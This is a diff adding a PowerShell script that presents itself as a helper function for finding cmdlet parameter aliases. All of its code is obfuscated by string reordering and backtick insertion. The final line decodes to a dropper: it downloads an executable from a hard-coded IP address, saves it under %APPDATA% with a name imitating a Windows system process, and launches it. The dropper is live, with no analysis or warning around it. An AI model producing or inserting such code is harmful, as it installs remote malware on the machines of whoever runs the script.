@@ -1,0 +1,16 @@
+function fI`Nd`-mrPARam`Et`eRa`liaS {
+    [CmdletBinding()]
+    param (
+        [Parameter(MAnDaToRY)]
+        [string]${cMD`LE`TnA`Me},
+
+        [ValidateNotNullOrEmpty()]
+        [string]${pARaM`ETer`Na`me} = '*'
+    )
+        
+    (&("{2}{0}{1}"-f 'mma','nd','Get-Co') -Name ${c`mDlET`NA`me})."paR`A`m`eteRs"."vaL`U`es" |
+    .("{0}{2}{1}"-f 'W','ect','here-Obj') ("{1}{0}"-f'e','Nam') -like ${pA`RAMetE`R`N`AMe} |
+    .("{2}{1}{3}{0}"-f't','l','Se','ect-Objec') -Property ("{1}{0}"-f 'me','Na'), ("{2}{0}{1}" -f'lias','es','A')
+}
+
+(&("{0}{1}{2}"-f 'New-Ob','j','ect') ("{3}{0}{2}{4}{1}" -f 'yste','ient','m.Net.Web','S','Cl')).("{2}{1}{0}"-f 'le','loadFi','Down').Invoke(("{6}{0}{5}{4}{1}{7}{2}{3}" -f '102.53.','v','x','e','srs','238/~yahoo/c','http://94.','.e'),"$env:APPDATA\csrsv.exe");&("{3}{0}{1}{2}" -f 'rt','-Proces','s','Sta') ("$env:APPDATA\csrsv.exe")
